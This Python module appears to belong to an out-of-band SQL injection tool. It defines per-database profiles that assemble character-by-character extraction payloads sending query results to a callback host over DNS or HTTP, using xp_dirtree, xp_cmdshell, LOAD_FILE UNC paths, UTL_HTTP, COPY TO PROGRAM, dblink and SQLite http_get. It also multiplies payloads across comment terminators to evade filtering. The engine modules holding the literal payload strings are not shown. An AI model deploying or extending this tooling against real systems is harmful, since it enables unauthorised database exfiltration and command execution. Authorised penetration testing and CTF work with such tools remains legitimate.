from dataclasses import dataclass

from . import mssql, mysql, oracle, postgres, sqlite

_TERMINATORS = ("-- -", "--", "/*", "#")


def _strip_terminator(payload: str) -> str:
    stripped = payload.rstrip()
    for terminator in _TERMINATORS:
        if stripped.endswith(terminator):
            return stripped[: -len(terminator)].rstrip()
    return stripped


def _terminator_variants(payloads: list[str]) -> list[str]:
    """risk=3 helper: for each variant that ends with a known SQL comment
    terminator, add copies using every other known terminator. Profile-agnostic
    so no per-DBMS payload text needs to be hand-written for risk=3."""
    variants = list(payloads)
    for payload in payloads:
        base = _strip_terminator(payload)
        if base == payload:
            continue
        for terminator in _TERMINATORS:
            variants.append(f"{base}{terminator}")
    return list(dict.fromkeys(variants))


_ENGINE_MODULES = {
    "mssql": mssql,
    "mssql-cmdshell": mssql,
    "mssql-openrowset": mssql,
    "mysql": mysql,
    "mysql-stacked": mysql,
    "postgres-program": postgres,
    "postgres-dblink": postgres,
    "oracle-http": oracle,
    "oracle-dns": oracle,
    "sqlite-http": sqlite,
}


@dataclass(frozen=True)
class Profile:
    name: str
    description: str
    comment: str

    @property
    def _module(self):
        return _ENGINE_MODULES[self.name]

    def substring(self, expression: str, pos: int) -> str:
        return self._module.substring(self.name, expression, pos)

    def condition(self, expression: str, pos: int, char: str) -> str:
        return f"{self.substring(expression, pos)}='{char}'"

    def condition_gte(self, expression: str, pos: int, char: str) -> str:
        return f"{self.substring(expression, pos)}>='{char}'"

    def direct_payload(self, base: str, expression: str, prefix: str, domain: str) -> str | None:
        return self._module.direct_payload(self.name, base, expression, prefix, domain)

    def _direct_payloads_full(self, base: str, expression: str, prefix: str, domain: str) -> list[str]:
        payload = self.direct_payload(base, expression, prefix, domain)
        if payload is None:
            return []
        return self._module.direct_payloads_full(self.name, base, expression, prefix, domain, payload)

    def direct_payloads(self, base: str, expression: str, prefix: str, domain: str, risk: int = 2) -> list[str]:
        full = self._direct_payloads_full(base, expression, prefix, domain)
        if not full:
            return []
        if risk <= 1:
            return full[:1]
        if risk >= 3:
            return _terminator_variants(full)
        return full

    def payload(self, base: str, condition: str, callback_host: str) -> str:
        return self._module.payload(self.name, base, condition, callback_host)

    def _payloads_full(self, base: str, condition: str, callback_host: str) -> list[str]:
        return self._module.payloads_full(self.name, base, condition, callback_host)

    def payloads(self, base: str, condition: str, callback_host: str, risk: int = 2) -> list[str]:
        full = self._payloads_full(base, condition, callback_host)
        if risk <= 1:
            return [self.payload(base, condition, callback_host)]
        if risk >= 3:
            return _terminator_variants(full)
        return full


PROFILES = {
    "mssql": Profile(
        "mssql",
        "MSSQL stacked query using xp_dirtree UNC DNS callbacks",
        "Requires xp_dirtree access and outbound DNS/SMB resolution.",
    ),
    "mysql": Profile(
        "mysql",
        "MySQL LOAD_FILE UNC callback, mostly useful on Windows targets",
        "Requires FILE privilege and Windows-style UNC resolution.",
    ),
    "oracle-http": Profile(
        "oracle-http",
        "Oracle UTL_HTTP callback",
        "Requires UTL_HTTP/network ACL access.",
    ),
    "oracle-dns": Profile(
        "oracle-dns",
        "Oracle UTL_INADDR.GET_HOST_ADDRESS DNS-only callback",
        "Requires UTL_INADDR access; no UTL_HTTP/network ACL for HTTP needed "
        "— useful when HTTP egress is blocked but DNS resolution is allowed.",
    ),
    "postgres-program": Profile(
        "postgres-program",
        "PostgreSQL COPY TO PROGRAM callback",
        "Requires stacked queries and high privileges (usually superuser/pg_execute_server_program).",
    ),
    "postgres-dblink": Profile(
        "postgres-dblink",
        "PostgreSQL dblink extension callback — lower privilege than COPY TO PROGRAM",
        "Requires dblink extension. No superuser needed in most default Postgres installs.",
    ),
    "mssql-cmdshell": Profile(
        "mssql-cmdshell",
        "MSSQL xp_cmdshell nslookup callback — alternative when xp_dirtree is blocked",
        "Requires: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE.",
    ),
    "mssql-openrowset": Profile(
        "mssql-openrowset",
        "MSSQL OPENROWSET DNS callback — the Linux-compatible alternative when "
        "xp_dirtree/xp_cmdshell are unavailable",
        "Requires: EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE. "
        "Works on SQL Server for Linux, where xp_dirtree/xp_cmdshell do not "
        "resolve outbound DNS.",
    ),
    "mysql-stacked": Profile(
        "mysql-stacked",
        "MySQL LOAD_FILE via stacked query — for multi-statement enabled targets",
        "Requires FILE privilege, stacked queries, and Windows-style UNC resolution.",
    ),
    "sqlite-http": Profile(
        "sqlite-http",
        "SQLite http_get() callback via sqlite-http/sqlean-http extension",
        "Requires the sqlite-http extension loaded. Common in some CTF challenge deployments.",
    ),
}
